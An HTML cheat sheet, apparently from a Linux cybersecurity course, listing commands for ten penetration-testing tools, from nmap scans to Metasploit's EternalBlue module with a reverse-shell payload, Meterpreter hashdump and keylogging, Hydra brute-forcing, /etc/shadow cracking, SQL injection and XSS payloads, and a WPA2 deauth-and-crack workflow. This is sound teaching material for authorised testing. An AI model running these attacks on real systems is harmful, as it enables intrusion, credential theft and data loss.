  Arsenal — Cybersecurity Tools Guide  :root { --bg: #0a0c10; --surface: #111318; --surface2: #1a1d26; --border: #1e2230; --border2: #2a2f45; --red: #ff3c5f; --red-dim: #7a1a2e; --yellow: #ffd166; --yellow-dim:#6b4e10; --green: #06d6a0; --green-dim: #0a4034; --cyan: #38bdf8; --cyan-dim: #0c3a52; --purple: #c084fc; --purple-dim:#3b1f5e; --muted: #4a5068; --text: #c9d1e0; --text-dim: #6b7394; --white: #e8ecf4; --glow-red: 0 0 20px rgba(255,60,95,0.3); --glow-cyan: 0 0 20px rgba(56,189,248,0.25); } \* { box-sizing: border-box; margin: 0; padding: 0; } html { scroll-behavior: smooth; } body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 13.5px; line-height: 1.7; min-height: 100vh; } /\* ── SCANLINE OVERLAY ── \*/ body::before { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient( 0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px ); pointer-events: none; z-index: 9999; } /\* ── HEADER ── \*/ .hero { background: linear-gradient(135deg, #0a0c10 0%, #0f1220 40%, #0c0e18 100%); border-bottom: 1px solid var(--border2); padding: 60px 40px 50px; text-align: center; position: relative; overflow: hidden; } .hero::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(255,60,95,0.07) 0%, transparent 70%); pointer-events: none; } .hero-badge { display: inline-block; border: 1px solid var(--red); color: var(--red); font-size: 10px; letter-spacing: 0.3em; padding: 4px 14px; border-radius: 2px; margin-bottom: 20px; box-shadow: var(--glow-red); animation: pulse 3s ease-in-out infinite; } @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.6; } } .hero h1 { font-family: 'Syne', sans-serif; font-size: clamp(2.2rem, 6vw, 4rem); font-weight: 800; letter-spacing: -0.02em; color: var(--white); line-height: 1.1; margin-bottom: 10px; } .hero h1 span { color: var(--red); } .hero-sub { color: var(--text-dim); font-size: 12px; letter-spacing: 0.15em; margin-top: 14px; } /\* ── TOOL PILLS NAV ── \*/ .tool-nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; padding: 28px 40px; background: var(--surface); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(12px); } .tool-nav a { text-decoration: none; color: var(--text-dim); font-size: 11px; letter-spacing: 0.1em; padding: 5px 12px; border: 1px solid var(--border2); border-radius: 2px; transition: all 0.2s; background: var(--surface2); } .tool-nav a:hover { color: var(--yellow); border-color: var(--yellow); background: rgba(255,209,102,0.06); box-shadow: 0 0 12px rgba(255,209,102,0.15); } /\* ── LAYOUT ── \*/ .container { max-width: 960px; margin: 0 auto; padding: 50px 30px 80px; display: flex; flex-direction: column; gap: 60px; } /\* ── WARNING BANNER ── \*/ .warning { display: flex; align-items: flex-start; gap: 14px; background: linear-gradient(90deg, rgba(255,60,95,0.08), transparent); border: 1px solid rgba(255,60,95,0.3); border-left: 3px solid var(--red); border-radius: 4px; padding: 16px 20px; color: #f08090; font-size: 12px; line-height: 1.7; } .warning-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; } /\* ── TOOL SECTION ── \*/ .tool-section { animation: fadeUp 0.4s ease both; } @keyframes fadeUp { from { opacity:0; transform: translateY(16px); } to { opacity:1; transform: translateY(0); } } .tool-header { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); } .tool-number { font-size: 11px; color: var(--red); letter-spacing: 0.1em; opacity: 0.7; flex-shrink: 0; width: 28px; } .tool-icon { font-size: 1.6rem; flex-shrink: 0; } .tool-name { font-family: 'Syne', sans-serif; font-size: 1.45rem; font-weight: 800; color: var(--white); } .tool-name span { color: var(--red); } .tool-badge { margin-left: auto; font-size: 10px; padding: 3px 10px; border-radius: 2px; letter-spacing: 0.1em; flex-shrink: 0; } .badge-net { background: var(--cyan-dim); color: var(--cyan); border: 1px solid rgba(56,189,248,0.3); } .badge-web { background: var(--purple-dim); color: var(--purple); border: 1px solid rgba(192,132,252,0.3); } .badge-exploit{ background: var(--red-dim); color: var(--red); border: 1px solid rgba(255,60,95,0.3); } .badge-hash { background: var(--yellow-dim); color: var(--yellow); border: 1px solid rgba(255,209,102,0.3); } .badge-wifi { background: var(--green-dim); color: var(--green); border: 1px solid rgba(6,214,160,0.3); } .install-line { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 12px; color: var(--text-dim); } .install-line code { background: var(--surface2); border: 1px solid var(--border2); color: var(--green); padding: 3px 10px; border-radius: 3px; font-family: inherit; } /\* ── CODE BLOCK ── \*/ .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-bottom: 16px; box-shadow: 0 2px 20px rgba(0,0,0,0.4); } .code-header { display: flex; align-items: center; gap: 10px; padding: 10px 16px; background: var(--surface2); border-bottom: 1px solid var(--border); font-size: 10px; letter-spacing: 0.15em; color: var(--text-dim); } .dot { width:10px; height:10px; border-radius:50%; } .dot-r { background: #ff5f57; } .dot-y { background: #febc2e; } .dot-g { background: #28c840; } .code-label { margin-left: 6px; } pre { padding: 20px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 12.5px; line-height: 1.75; white-space: pre; tab-size: 4; } /\* Syntax coloring \*/ .c { color: var(--muted); } /\* comment \*/ .cmd{ color: var(--cyan); } /\* command name \*/ .fl { color: var(--yellow); } /\* flags like -l -P \*/ .val{ color: var(--green); } /\* values / IPs \*/ .op { color: var(--red); } /\* operators < > | → \*/ .str{ color: #a8d8a8; } /\* strings \*/ .kw { color: var(--purple); } /\* keywords \*/ .sec{ color: var(--white); font-weight:500; letter-spacing:0.05em; } /\* section \*/ /\* ── SUMMARY TABLE ── \*/ .summary-table { width: 100%; border-collapse: collapse; font-size: 12.5px; } .summary-table th { text-align: left; font-size: 10px; letter-spacing: 0.2em; color: var(--red); padding: 10px 16px; border-bottom: 1px solid var(--border2); font-weight: 500; } .summary-table td { padding: 10px 16px; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: middle; } .summary-table tr:last-child td { border-bottom: none; } .summary-table tr:hover td { background: var(--surface2); } .summary-table .tool-col { color: var(--cyan); font-weight: 500; white-space: nowrap; } .summary-table .cat-pill { display: inline-block; font-size: 9px; padding: 2px 8px; border-radius: 2px; letter-spacing: 0.1em; margin-left: 8px; vertical-align: middle; } /\* ── FOOTER ── \*/ .footer { text-align: center; padding: 40px; border-top: 1px solid var(--border); color: var(--muted); font-size: 11px; letter-spacing: 0.1em; } .footer span { color: var(--red); }

CYBERSEC TOOLS GUIDE · v2.0

THE ARSENAL
===========

nmap · wireshark · burpsuite · metasploit · hydra · john · aircrack · nikto · gobuster · hashcat

[01 NMAP](#nmap) [02 WIRESHARK](#wireshark) [03 BURPSUITE](#burpsuite) [04 METASPLOIT](#metasploit) [05 HYDRA](#hydra) [06 JOHN](#john) [07 HASHCAT](#hashcat) [08 AIRCRACK-NG](#aircrack) [09 NIKTO](#nikto) [10 GOBUSTER](#gobuster) [SUMMARY](#summary)

⚠️

**LEGAL WARNING**  
Only use these tools on systems you own or have **explicit written permission** to test. Unauthorized scanning, exploitation, or interception is illegal in most jurisdictions and carries serious criminal penalties.

01 🔍 NMAP NETWORK

INSTALL → `sudo apt install nmap`

BASIC SCANS

nmap 192.168.1.1               \# Default scan (top 1000 ports)
nmap 192.168.1.0/24           \# Scan entire subnet
nmap \-iL targets.txt           \# Scan from file
nmap scanme.nmap.org           \# Official safe test target

PORT SPECIFICATION

nmap \-p 22,80,443 192.168.1.1  \# Specific ports
nmap \-p 1-65535 192.168.1.1    \# ALL ports
nmap \-p- 192.168.1.1            \# Shorthand — all ports
nmap \--top-ports 100 192.168.1.1 \# Top 100 most common

SCAN TYPES

nmap \-sS 192.168.1.1  \# SYN scan — stealth (default w/ root)
nmap \-sT 192.168.1.1  \# TCP connect — no root needed
nmap \-sU 192.168.1.1  \# UDP scan
nmap \-sn 192.168.1.0/24  \# Ping sweep — host discovery only

SERVICE & OS DETECTION

nmap \-sV 192.168.1.1  \# Service version detection
nmap \-O  192.168.1.1  \# OS detection (requires root)
nmap \-A  192.168.1.1  \# Aggressive: OS + version + scripts + traceroute

NSE SCRIPTS

nmap \-sC                  192.168.1.1  \# Run default scripts
nmap \--script vuln         192.168.1.1  \# Vulnerability detection
nmap \--script http-title  192.168.1.1  \# Grab HTTP page titles
nmap \--script ssh-brute   192.168.1.1  \# SSH brute force (labs only!)

⭐ PENTEST COMBO — USE THIS

nmap \-sV -sC -p- -T4 \-oN output.txt 192.168.1.1

\# -sV  → version detection
\# -sC  → default NSE scripts
\# -p-  → scan ALL 65535 ports
\# -T4  → aggressive timing (fast)
\# -oN  → save readable output to file

02 🦈 WIRESHARK NETWORK

INSTALL → `sudo apt install wireshark`

TSHARK — COMMAND LINE

tshark \-i eth0                            \# Live capture on eth0
tshark \-i eth0 \-w capture.pcap             \# Save to file
tshark \-r capture.pcap                      \# Read saved capture
tshark \-i eth0 \-f "port 80"               \# Capture filter — HTTP only
tshark \-r file.pcap \-Y "http"             \# Display filter — HTTP packets
tshark \-r file.pcap \-T fields -e http.host \# Extract HTTP hostnames

DISPLAY FILTERS (GUI)

http                               \# All HTTP traffic
http.request.method \== "POST"     \# Only POST requests
ip.addr \== 192.168.1.10          \# Traffic to/from specific IP
ip.src \== 192.168.1.10           \# Traffic FROM specific IP
tcp.port \== 443                   \# HTTPS traffic
dns                                \# All DNS queries
tcp.flags.syn \== 1               \# SYN packets (connection attempts)
!(arp or dns or icmp)            \# Exclude noise

DECODE BASE64 CREDENTIALS

\# Filter: http.authorization  →  look for Basic Auth
\# Base64 decode any encoded credentials:
echo "dXNlcjpwYXNz" | base64 \-d   \# Reveals → user:pass

03 🕷️ BURP SUITE WEB APP

INSTALL → `portswigger.net` (Community Edition is free)

SETUP — PROXY INTERCEPTION

\# 1. Launch Burp → Proxy tab → Intercept: ON
\# 2. Set browser proxy → 127.0.0.1:8080
\# 3. Install Burp CA cert for HTTPS:
\#    Navigate to http://burpsuite → Download certificate

INTRUDER — ATTACK TYPES

Sniper      → One payload position, iterate one list
Battering   → One position, all combos from one list
Cluster     → Multiple positions simultaneously
Pitchfork   → Multiple positions, multiple lists (username:password)

COMMON PAYLOADS

\# ── SQL INJECTION ──────────────────────────────────
id=1'
id=1 OR 1\=1\--
id=1; DROP TABLE users\--

\# ── XSS ────────────────────────────────────────────
<script\>alert(1)</script\>
"><img src\=x onerror\=alert(1)\>

\# ── AUTH BYPASS ─────────────────────────────────────
admin=false  →  admin=true
role=user    →  role=admin

04 💀 METASPLOIT EXPLOIT

INSTALL → `sudo apt install metasploit-framework` (pre-installed on Kali)

SEARCH & SELECT

msfconsole                                  \# Launch Metasploit
search eternalblue                          \# Search by name/CVE
search type:exploit platform:windows       \# Filter results
use exploit/windows/smb/ms17\_010\_eternalblue \# Select module
info                                         \# Full module info

CONFIGURE & RUN

show options                                       \# List required options
set RHOSTS  192.168.1.10                          \# Target IP
set RPORT   445                                    \# Target port
set LHOST   192.168.1.5                            \# Your listener IP
set LPORT   4444                                   \# Listener port
set PAYLOAD windows/x64/meterpreter/reverse\_tcp   \# Payload
check                                               \# Verify vulnerability
run                                                 \# Fire!

METERPRETER — POST EXPLOITATION

sysinfo              \# System info
getuid               \# Current user
getsystem            \# Attempt privilege escalation
hashdump             \# Dump password hashes
ps                   \# List processes
migrate <PID\>         \# Migrate to another process
shell                \# Drop to system shell
keyscan\_start        \# Start keylogger
screenshot           \# Take screenshot
upload   /local /remote  \# Upload file
download /remote /local  \# Download file

05 🔑 HYDRA BRUTE FORCE

INSTALL → `sudo apt install hydra`

COMMON PROTOCOLS

\# ── SSH ───────────────────────────────────────────────────
hydra \-l admin \-P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra \-L users.txt \-P passwords.txt ssh://192.168.1.10
hydra \-l root \-P rockyou.txt \-t 4 ssh://192.168.1.10

\# ── FTP ───────────────────────────────────────────────────
hydra \-l admin \-P rockyou.txt ftp://192.168.1.10

\# ── HTTP FORM LOGIN ───────────────────────────────────────
hydra \-l admin \-P rockyou.txt 192.168.1.10 http-post-form \\
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

\# ── HTTP BASIC AUTH ───────────────────────────────────────
hydra \-l admin \-P rockyou.txt http-get://192.168.1.10/admin

\# ── RDP ───────────────────────────────────────────────────
hydra \-l administrator \-P rockyou.txt rdp://192.168.1.10

KEY FLAGS REFERENCE

\-l   Single username          \-L   Username list file
\-p   Single password           \-P   Password list file
\-t   Parallel threads (16)     \-V   Verbose — show each attempt
\-f   Stop after first hit      \-o   Save results to file

06 🔓 JOHN THE RIPPER HASH CRACKER

INSTALL → `sudo apt install john`

CRACKING HASHES

john hashes.txt                              \# Auto-detect format
john \--wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

\# Format-specific
john \--format=md5    hashes.txt
john \--format=sha256 hashes.txt
john \--format=bcrypt hashes.txt
john \--format=NT     hashes.txt  \# Windows NTLM

LINUX / ZIP / RAR

\# ── Linux Shadow File ──────────────────────
unshadow /etc/passwd /etc/shadow \> combined.txt
john combined.txt

\# ── Protected ZIP ──────────────────────────
zip2john protected.zip \> zip.hash
john zip.hash \--wordlist=rockyou.txt

\# ── Protected RAR ──────────────────────────
rar2john protected.rar \> rar.hash
john rar.hash \--wordlist=rockyou.txt

\# ── Show results ───────────────────────────
john \--show hashes.txt

\# ── Mutation rules ─────────────────────────
john \--wordlist=rockyou.txt \--rules hashes.txt

07 ⚡ HASHCAT GPU CRACKER

INSTALL → `sudo apt install hashcat`

HASH MODES (-m) REFERENCE

\-m 0      MD5
\-m 100    SHA1
\-m 1400   SHA-256
\-m 1800   sha512crypt  (Linux $6$)
\-m 1000   NTLM         (Windows)
\-m 3200   bcrypt
\-m 22000  WPA2         (WiFi)

ATTACK MODES (-a)

\# Dictionary attack
hashcat \-m 0    \-a 0 hash.txt rockyou.txt      \# MD5 + wordlist
hashcat \-m 1000 \-a 0 ntlm.txt rockyou.txt     \# Windows NTLM

\# Brute force with mask
hashcat \-m 0 \-a 3 hash.txt ?d?d?d?d          \# 4-digit PIN
hashcat \-m 0 \-a 3 hash.txt ?u?l?l?l?d?d?d?d  \# Upper+lower+digits

\# Mask charset key:
\# ?l = lowercase   ?u = uppercase   ?d = digit   ?s = special   ?a = all

\# With rules
hashcat \-m 0 \-a 0 hash.txt rockyou.txt \-r best64.rule

\# Show results
hashcat \-m 0 hash.txt \--show

08 📶 AIRCRACK\-NG WIRELESS

INSTALL → `sudo apt install aircrack-ng`

FULL WORKFLOW — WPA2 CAPTURE

\# 1. Enable monitor mode
sudo airmon-ng check kill       \# Kill interfering processes
sudo airmon-ng start wlan0      \# → wlan0mon

\# 2. Scan for networks
sudo airodump-ng wlan0mon

\# 3. Target & capture handshake
sudo airodump-ng \-c 6 \--bssid AA:BB:CC:DD:EE:FF \-w capture wlan0mon

\# 4. Force handshake via deauth
sudo aireplay-ng \-0 10 \-a AA:BB:CC:DD:EE:FF wlan0mon

\# 5. Crack the handshake
aircrack-ng \-w rockyou.txt \-b AA:BB:CC:DD:EE:FF capture-01.cap

\# 6. Stop monitor mode
sudo airmon-ng stop wlan0mon

⚡ FASTER — HASHCAT + HCXTOOLS

hcxdumptool \-i wlan0mon \-o capture.pcapng \--enable-status=1
hcxpcapngtool \-o hash.hc22000 capture.pcapng
hashcat \-m 22000 hash.hc22000 rockyou.txt

09 🕸️ NIKTO WEB SCANNER

INSTALL → `sudo apt install nikto`

SCANNING

nikto \-h http://192.168.1.10                          \# HTTP target
nikto \-h https://192.168.1.10                         \# HTTPS target
nikto \-h 192.168.1.10 \-port 8080                     \# Non-default port
nikto \-h 192.168.1.10 \-o report.html \-Format htm      \# HTML report
nikto \-h 192.168.1.10 \-useproxy http://127.0.0.1:8080 \# Through Burp

TUNING FLAGS

\-Tuning 1   XSS tests only
\-Tuning 4   Injection tests only
\-ssl        Force SSL

\# Nikto checks for:
→ Outdated software versions
→ Dangerous HTTP methods  (PUT, DELETE)
→ Default credentials
→ Common exposed paths    (/admin, /backup, /config)
→ Missing security headers

10 📂 GOBUSTER FUZZER

INSTALL → `sudo apt install gobuster`

DIRECTORY & SUBDOMAIN ENUM

\# Directory brute force
gobuster dir \-u http://192.168.1.10 \-w /usr/share/wordlists/dirb/common.txt
gobuster dir \-u http://192.168.1.10 \-w common.txt \-x php,html,txt,bak

\# Subdomain enumeration
gobuster dns \-d example.com \-w subdomains-top1million-5000.txt

\# VHost discovery
gobuster vhost \-u http://example.com \-w subdomains.txt

KEY FLAGS

\-u   Target URL              \-w   Wordlist path
\-x   File extensions         \-t   Threads (default 10, use 50+)
\-o   Output file             \-k   Skip TLS verification
\-s   Show status codes only  \-b   Blacklist codes: \-b 404,403

\# Install SecLists (essential wordlists)
sudo apt install seclists

★ 📋 QUICK REFERENCE

TOOL CHEATSHEET SUMMARY

TOOL

CATEGORY

PRIMARY USE

nmap

NETWORK

Network/port scanning, service & OS detection

wireshark

NETWORK

Packet capture, traffic analysis, credential sniffing

burpsuite

WEB APP

Web app testing, request interception & modification

metasploit

EXPLOIT

Exploitation framework, post-exploitation, pivoting

hydra

BRUTE FORCE

Online password brute forcing (SSH, FTP, HTTP…)

john

HASH

Offline hash cracking, CPU — zip/rar/shadow files

hashcat

HASH

Offline hash cracking, GPU-accelerated, masks & rules

aircrack-ng

WIRELESS

WiFi security testing, WPA2 handshake capture & crack

nikto

WEB SCAN

Web server vulnerability scanning, misconfigurations

gobuster

FUZZER

Directory brute force, subdomain & vhost enumeration

"A tool is only as good as the person wielding it."  
Understand what each command does — never blindly copy.  
  
Part of the Linux Cybersec Course · Use responsibly
